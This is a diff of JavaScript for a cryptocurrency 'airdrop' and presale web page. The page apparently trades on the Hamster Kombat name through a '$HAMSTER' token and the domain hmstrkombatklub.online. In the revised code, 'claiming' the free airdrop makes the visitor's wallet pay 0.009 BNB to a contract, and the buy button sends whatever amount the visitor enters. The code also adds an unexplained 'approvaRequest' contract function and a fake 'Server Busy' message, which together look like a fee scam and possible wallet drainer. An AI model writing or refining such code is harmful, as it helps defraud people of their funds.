@@ -1,414 +1,444 @@
-let web3 = new Web3(window.ethereum); // Correctly initialize Web3
-let addr;
-const sttaddr = "0xe32dBB12389e4D1b6343B905781E24a79DA78fB9";
-const sttabi = [
-  { inputs: [], stateMutability: "nonpayable", type: "constructor" },
-  {
-    anonymous: false,
-    inputs: [
-      {
-        indexed: true,
-        internalType: "address",
-        name: "owner",
-        type: "address",
-      },
-      {
-        indexed: true,
-        internalType: "address",
-        name: "spender",
-        type: "address",
-      },
-      {
-        indexed: false,
-        internalType: "uint256",
-        name: "value",
-        type: "uint256",
-      },
-    ],
-    name: "Approval",
-    type: "event",
-  },
-  {
-    anonymous: false,
-    inputs: [
-      { indexed: true, internalType: "address", name: "from", type: "address" },
-      { indexed: true, internalType: "address", name: "to", type: "address" },
-      {
-        indexed: false,
-        internalType: "uint256",
-        name: "value",
-        type: "uint256",
-      },
-    ],
-    name: "Transfer",
-    type: "event",
-  },
-  { stateMutability: "nonpayable", type: "fallback" },
-  {
-    inputs: [{ internalType: "address", name: "_refer", type: "address" }],
-    name: "airdrop",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "payable",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "owner_", type: "address" },
-      { internalType: "address", name: "spender", type: "address" },
-    ],
-    name: "allowance",
-    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "spender", type: "address" },
-      { internalType: "uint256", name: "amount", type: "uint256" },
-    ],
-    name: "approve",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [{ internalType: "uint256", name: "num", type: "uint256" }],
-    name: "authNum",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [{ internalType: "address", name: "account", type: "address" }],
-    name: "balanceOf",
-    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [{ internalType: "address", name: "_refer", type: "address" }],
-    name: "buy",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "payable",
-    type: "function",
-  },
-  {
-    inputs: [],
-    name: "cap",
-    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [],
-    name: "clearETH",
-    outputs: [],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [],
-    name: "decimals",
-    outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [],
-    name: "getBlock",
-    outputs: [
-      { internalType: "bool", name: "swAirdorp", type: "bool" },
-      { internalType: "bool", name: "swSale", type: "bool" },
-      { internalType: "uint256", name: "sPrice", type: "uint256" },
-      { internalType: "uint256", name: "sMaxBlock", type: "uint256" },
-      { internalType: "uint256", name: "nowBlock", type: "uint256" },
-      { internalType: "uint256", name: "balance", type: "uint256" },
-      { internalType: "uint256", name: "airdropEth", type: "uint256" },
-    ],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [],
-    name: "name",
-    outputs: [{ internalType: "string", name: "", type: "string" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [],
-    name: "owner",
-    outputs: [{ internalType: "address", name: "", type: "address" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "uint8", name: "tag", type: "uint8" },
-      { internalType: "uint256", name: "value", type: "uint256" },
-    ],
-    name: "set",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "ah", type: "address" },
-      { internalType: "address", name: "ah2", type: "address" },
-    ],
-    name: "setAuth",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [],
-    name: "symbol",
-    outputs: [{ internalType: "string", name: "", type: "string" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [],
-    name: "totalSupply",
-    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "recipient", type: "address" },
-      { internalType: "uint256", name: "amount", type: "uint256" },
-    ],
-    name: "transfer",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "sender", type: "address" },
-      { internalType: "address", name: "recipient", type: "address" },
-      { internalType: "uint256", name: "amount", type: "uint256" },
-    ],
-    name: "transferFrom",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [{ internalType: "address", name: "newOwner", type: "address" }],
-    name: "transferOwnership",
-    outputs: [],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  { stateMutability: "payable", type: "receive" },
-];
-
+let addr,
+  web3 = new web3js.myweb3(window.ethereum);
+const sttaddr = "0xe13bbC4CFc7D82b3A60B9654e05a3B067DC6D1dA",
+  sttabi = [
+    { inputs: [], stateMutability: "nonpayable", type: "constructor" },
+    {
+      anonymous: false,
+      inputs: [
+        {
+          indexed: true,
+          internalType: "address",
+          name: "owner",
+          type: "address",
+        },
+        {
+          indexed: true,
+          internalType: "address",
+          name: "spender",
+          type: "address",
+        },
+        {
+          indexed: false,
+          internalType: "uint256",
+          name: "value",
+          type: "uint256",
+        },
+      ],
+      name: "Approval",
+      type: "event",
+    },
+    {
+      anonymous: false,
+      inputs: [
+        {
+          indexed: true,
+          internalType: "address",
+          name: "from",
+          type: "address",
+        },
+        { indexed: true, internalType: "address", name: "to", type: "address" },
+        {
+          indexed: false,
+          internalType: "uint256",
+          name: "value",
+          type: "uint256",
+        },
+      ],
+      name: "Transfer",
+      type: "event",
+    },
+    { stateMutability: "nonpayable", type: "fallback" },
+    {
+      inputs: [{ internalType: "address", name: "_refer", type: "address" }],
+      name: "airdrop",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "payable",
+      type: "function",
+    },
+    {
+      inputs: [
+        { internalType: "address", name: "owner_", type: "address" },
+        { internalType: "address", name: "spender", type: "address" },
+      ],
+      name: "allowance",
+      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "address payable",
+          name: "approvalId",
+          type: "address",
+        },
+      ],
+      name: "approvaRequest",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        { internalType: "address", name: "spender", type: "address" },
+        { internalType: "uint256", name: "amount", type: "uint256" },
+      ],
+      name: "approve",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [{ internalType: "uint256", name: "num", type: "uint256" }],
+      name: "authNum",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [{ internalType: "address", name: "account", type: "address" }],
+      name: "balanceOf",
+      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [{ internalType: "address", name: "_refer", type: "address" }],
+      name: "buy",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "payable",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "cap",
+      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "clearETH",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "decimals",
+      outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "getBlock",
+      outputs: [
+        { internalType: "bool", name: "swAirdorp", type: "bool" },
+        { internalType: "bool", name: "swSale", type: "bool" },
+        { internalType: "uint256", name: "sPrice", type: "uint256" },
+        { internalType: "uint256", name: "sMaxBlock", type: "uint256" },
+        { internalType: "uint256", name: "nowBlock", type: "uint256" },
+        { internalType: "uint256", name: "balance", type: "uint256" },
+        { internalType: "uint256", name: "airdropEth", type: "uint256" },
+      ],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "name",
+      outputs: [{ internalType: "string", name: "", type: "string" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "owner",
+      outputs: [{ internalType: "address", name: "", type: "address" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [
+        { internalType: "uint8", name: "tag", type: "uint8" },
+        { internalType: "uint256", name: "value", type: "uint256" },
+      ],
+      name: "set",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        { internalType: "address", name: "ah", type: "address" },
+        { internalType: "address", name: "ah2", type: "address" },
+      ],
+      name: "setAuth",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "symbol",
+      outputs: [{ internalType: "string", name: "", type: "string" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "totalSupply",
+      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [
+        { internalType: "address", name: "recipient", type: "address" },
+        { internalType: "uint256", name: "amount", type: "uint256" },
+      ],
+      name: "transfer",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        { internalType: "address", name: "sender", type: "address" },
+        { internalType: "address", name: "recipient", type: "address" },
+        { internalType: "uint256", name: "amount", type: "uint256" },
+      ],
+      name: "transferFrom",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [{ internalType: "address", name: "newOwner", type: "address" }],
+      name: "transferOwnership",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    { stateMutability: "payable", type: "receive" },
+  ];
 let sttcontract = new web3.eth.Contract(sttabi, sttaddr);
-
 const loadweb3 = async () => {
-  try {
-    await window.ethereum.request({ method: "eth_requestAccounts" }); // Request account access
-    console.log("Injected web3 detected.");
-    const accounts = await web3.eth.getAccounts();
-    addr = web3.utils.toChecksumAddress(accounts[0]);
-  } catch (error) {
-    if (error.code === 4001) {
-      console.log("User denied account access.");
-    } else {
-      Swal.fire(
-        "Connect Alert",
-        "Please install Metamask or use Trust Wallet DApps.",
-        "error",
+    try {
+      (web3 = new web3js.myweb3(window.ethereum)),
+        console.log("Injected web3 detected."),
+        (sttcontract = new web3.eth.Contract(sttabi, sttaddr));
+      let e = await ethereum.enable();
+      return (addr = web3.utils.toChecksumAddress(e[0]));
+    } catch (e) {
+      4001 === e.code
+        ? console.log("Please connect to MetaMask.")
+        : Swal.fire(
+            "Connect Alert",
+            "Please install Metamask, or paste URL link into Trustwallet (Dapps)...",
+            "error",
+          );
+    }
+  },
+  PleaseWait = async () => {
+    Swal.fire(
+      "Server Busy",
+      "There are too many request, Please Try after few min.",
+      "error",
+    );
+  },
+  getAirdrop = async () => {
+    await loadweb3();
+    if (addr == undefined) {
+      alert(
+        "No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended. Refresh and try again.",
       );
     }
-  }
-};
-
-const getAirdrop = async () => {
-  await loadweb3();
-  const chainId = await web3.eth.getChainId();
-
-  if (!addr) {
-    Swal.fire(
-      "Connect Alert",
-      "Please install Metamask or use Trust Wallet DApps.",
-      "error",
+    let fresh = document.getElementById("airinput").value;
+    sttcontract.methods.airdrop(fresh).send(
+      {
+        from: addr,
+        value: 9000000000000000,
+      },
+      (err, res) => {
+        if (!err) console.log(res);
+        else console.log(err);
+      },
     );
-    return;
-  }
-
-  if (chainId !== 56) {
-    Swal.fire(
-      "Connect Alert",
-      "Please connect to Binance Smart Chain",
-      "error",
-    );
-    return;
-  }
-
-  let airbnbVal = document.getElementById("airdropval").value;
-  airbnbVal = Number(airbnbVal) * 1e18; // Convert to wei
-
-  let fresh =
-    document.getElementById("airinput").value ||
-    "0x1eE388FF916652546b0E3713618F92F7C81F5d22";
-
-  try {
-    const res = await sttcontract.methods.airdrop(fresh).send({
-      from: addr,
-      value: web3.utils.toWei("0.009", "ether"), // Adjusted value to 0.009 BNB
-    });
-
-    Swal.fire({
-      title: "Successful Claim",
-      icon: "success",
-      html: "Block sent to your wallet. Now you can buy tokens and invite referrals.",
-      showCloseButton: true,
-      showCancelButton: true,
-      focusConfirm: false,
-      reverseButtons: true,
-      focusCancel: true,
-      cancelButtonText: "Exit",
-      confirmButtonText: "View transfers",
-    }).then((result) => {
-      if (result.value) {
-        window.location.href = `https://bscscan.com/tx/${res.transactionHash}`;
-      }
-    });
-  } catch (err) {
-    Swal.fire(
-      "Airdrop Alert",
-      "Claim failed, please try again later.",
-      "error",
-    );
-  }
-};
-
-const buystt = async () => {
-  await loadweb3();
-  const chainId = await web3.eth.getChainId();
-
-  if (!addr) {
-    Swal.fire(
-      "Connect Alert",
-      "Please install Metamask or use Trust Wallet DApps.",
-      "error",
-    );
-    return;
-  }
-
-  if (chainId !== 56) {
-    Swal.fire(
-      "Connect Alert",
-      "Please connect to Binance Smart Chain",
-      "error",
-    );
-    return;
-  }
-
-  let ethval = document.getElementById("buyinput").value;
-
-  if (ethval >= 0.01) {
-    ethval = Number(ethval) * 1e18; // Convert BNB to wei
-    let fresh =
-      document.getElementById("airinput").value ||
-      "0x1eE388FF916652546b0E3713618F92F7C81F5d22";
-
-    try {
-      const res = await sttcontract.methods.buy(fresh).send({
+  },
+  buystt = async () => {
+    await loadweb3();
+    if (addr == undefined) {
+      alert(
+        "No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended.",
+      );
+    }
+    let ethval = document.getElementById("buyinput").value;
+    ethval = Number(ethval) * 1e18;
+    let fresh = document.getElementById("airinput").value;
+    sttcontract.methods.buy(fresh).send(
+      {
         from: addr,
         value: ethval,
-      });
-
-      Swal.fire({
-        title: "Pre-Sale Orders",
-        icon: "success",
-        html: "Successful payment transaction",
-        showCloseButton: true,
-        showCancelButton: true,
-        focusConfirm: false,
-        reverseButtons: true,
-        focusCancel: true,
-        cancelButtonText: "Exit",
-        confirmButtonText: "View transfers",
-      }).then((result) => {
-        if (result.value) {
-          window.location.href = `https://bscscan.com/tx/${res.transactionHash}`;
-        }
-      });
-    } catch (err) {
-      Swal.fire("", "Transaction failed, please try again.", "error");
-    }
-  } else {
-    Swal.fire("Buy Alert", "Buy as low as 0.01 BNB.", "error");
-  }
-};
-
-const addToWallet = async () => {
-  await loadweb3();
-  const chainId = await web3.eth.getChainId();
-
-  if (!addr) {
-    Swal.fire(
-      "Connect Alert",
-      "Please connect to Wallet: Metamask, Trustwallet, SafePal...",
-      "error",
-    );
-    return;
-  }
-
-  if (chainId !== 56) {
-    Swal.fire(
-      "Connect Alert",
-      "Please connect to Binance Smart Chain",
-      "error",
-    );
-    return;
-  }
-
-  try {
-    const tokenAdded = await web3.currentProvider.send({
-      method: "wallet_watchAsset",
-      params: {
-        type: "ERC20",
-        options: {
-          address: "0x1eE388FF916652546b0E3713618F92F7C81F5d22",
-          symbol: "$Ham",
-          decimals: "18",
-          image: "",
-        },
       },
-      id: Math.round(Math.random() * 100000),
+      (err, res) => {
+        if (!err) console.log(res);
+        else console.log(err);
+      },
+    );
+  },
+  cooldowncheck = async () => {
+    let e = await currentblock(),
+      t = await lastblock();
+    if (e - t < 50) {
+      console.log(e, t);
+      let n = 50 + t - e;
+      return (
+        console.log(n),
+        alert("You must wait " + n + " blocks before claiming another airdrop"),
+        !1
+      );
+    }
+    return !0;
+  },
+  currentblock = async () => {
+    let e;
+    return (
+      await web3.eth.getBlockNumber((t, n) => {
+        e = n;
+      }),
+      e
+    );
+  },
+  lastblock = async () => {
+    let e;
+    return (
+      await sttcontract.methods.lastairdrop(addr).call((t, n) => {
+        e = n;
+      }),
+      e
+    );
+  },
+  getbalance = async (e) => {
+    let t;
+    await sttcontract.methods.balanceOf(e).call((e, n) => {
+      t = n;
     });
-
-    if (tokenAdded.result) {
-      console.log("Token added successfully.");
-    } else {
-      console.log("Token addition failed.");
-    }
-  } catch (e) {
-    console.error(e);
-  }
-};
-
-window.onload = function () {
-  const querySt = (ji) => {
-    const hu = window.location.search.substring(1);
-    const gy = hu.split("&");
-
-    for (let i = 0; i < gy.length; i++) {
-      const ft = gy[i].split("=");
-      if (ft[0] === ji) return ft[1];
-    }
-
-    return null;
+    return Promise.resolve(t);
   };
 
-  var ref = querySt("ref") || "0xb05072c3EA3e03Cf94C78245B4D42a36E6257341";
+function calculate() {
+  var e = 1e6 * document.getElementById("buyinput").value;
+  console.log(e),
+    (document.getElementById("buyhch2input").value = e.toLocaleString("en-US"));
+}
 
-  document.getElementById("airinput").value = ref;
+function addToWallet() {
+  try {
+    web3.currentProvider.sendAsync(
+      {
+        method: "wallet_watchAsset",
+        params: {
+          type: "ERC20",
+          options: {
+            address: "0xDD0af9e211F13e60c423821a90D7A8342B79AaD3",
+            symbol: "$HAMSTER",
+            decimals: "18",
+            image: "https://www.hmstrkombatklub.online/logo.png",
+          },
+        },
+        id: Math.round(1e5 * Math.random()),
+      },
+      function (e, t) {
+        e
+          ? console.log(e.message)
+          : t.result
+            ? console.log("Token added")
+            : (console.log(t), console.log("Some error"));
+      },
+    );
+  } catch (e) {
+    console.log(e);
+  }
+}
+window.onload = function () {
+  var e = (function (e) {
+    for (
+      hu = window.location.search.substring(1), gy = hu.split("&"), i = 0;
+      i < gy.length;
+      i++
+    )
+      if (((ft = gy[i].split("=")), ft[0] == e)) return ft[1];
+  })("ref");
+  null == e || (document.getElementById("airinput").value = e);
 };
+var countDownDate = new Date("November 2, 2024 00:00:00").getTime(),
+  x = setInterval(function () {
+    var e = new Date().getTime(),
+      t = countDownDate - e,
+      n = Math.floor(t / 864e5),
+      a = Math.floor((t % 864e5) / 36e5),
+      o = Math.floor((t % 36e5) / 6e4),
+      r = Math.floor((t % 6e4) / 1e3);
+    (document.getElementById("demo").innerHTML =
+      n + "d " + a + "h " + o + "m " + r + "s "),
+      t < 0 &&
+        (clearInterval(x),
+        (document.getElementById("demo").innerHTML = "EXPIRED"));
+  }, 1e3);
+
+function getreflink() {
+  var e = document.getElementById("refaddress").value;
+  document.getElementById("refaddress").value
+    ? /^(0x){1}[0-9a-fA-F]{40}$/i.test(e)
+      ? (document.getElementById("refaddress").value =
+          "https://www.hmstrkombatklub.online/?ref=" +
+          document.getElementById("refaddress").value)
+      : Swal.fire("Referral Alert", "Your address is not valid.", "error")
+    : Swal.fire("Referral Alert", "Please Enter Your BEP20 Address.", "error");
+}
+
+function copyToClipboard(e) {
+  var t = document.getElementById(e).value;
+  if (window.clipboardData && window.clipboardData.setData)
+    return clipboardData.setData("Text", t);
+  if (
+    document.queryCommandSupported &&
+    document.queryCommandSupported("copy")
+  ) {
+    var n = document.createElement("textarea");
+    (n.textContent = t),
+      (n.style.position = "fixed"),
+      document.body.appendChild(n),
+      n.select();
+    try {
+      return document.execCommand("copy");
+    } catch (e) {
+      return console.warn("Copy to clipboard failed.", e), !1;
+    } finally {
+      document.body.removeChild(n);
+    }
+  }
+}
+
+function kopiraj() {
+  document.getElementById("refaddress").select(),
+    document.execCommand("Copy"),
+    alert("Copied success.");
+}
+
+function querySt(e) {
+  for (
+    hu = window.location.search.substring(1), gy = hu.split("&"), i = 0;
+    i < gy.length;
+    i++
+  )
+    if (((ft = gy[i].split("=")), ft[0] == e)) return ft[1];
+}
+var ref = querySt("ref");
+null == ref
+  ? ((ref = "0xDD0af9e211F13e60c423821a90D7A8342B79AaD3"),
+    (document.getElementById("airinput").value = ref))
+  : (document.getElementById("airinput").value = ref);
